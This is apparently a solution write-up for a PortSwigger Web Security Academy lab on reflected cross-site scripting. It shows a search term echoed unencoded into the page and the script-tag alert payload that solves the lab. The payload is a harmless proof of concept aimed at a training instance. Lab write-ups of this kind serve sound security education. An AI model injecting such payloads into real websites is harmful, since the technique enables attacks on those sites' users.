## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/53d22dc1-6253-47ef-9b5f-5bc9d4169093)

## Solution :

We straightaway see a search functionality.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/67776d6c-a336-46c9-9939-df03e1a8ec33)

The application echoes the supplied search term in the response to this URL: 

```
https://0a650005031fe4c282a94ddd00e50078.web-security-academy.net/?search=hello
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/686631a9-0ab4-4161-a2b4-f05d66c2e9a1)

Click  **View Selection Source**, shows how our data is being embedded in the page.

```html
<h1>0 search results for 'hello'</h1>
```

### Payload

Enter the following simple XSS payload to trigger an alert!

```js
<script>alert(1)</script>
```

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e4cc8a98-9582-4ae8-bc34-d85b17eb7b04)

We have thus solved the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f32036f3-ff77-4b40-8dbb-2b4ba53c87d6)
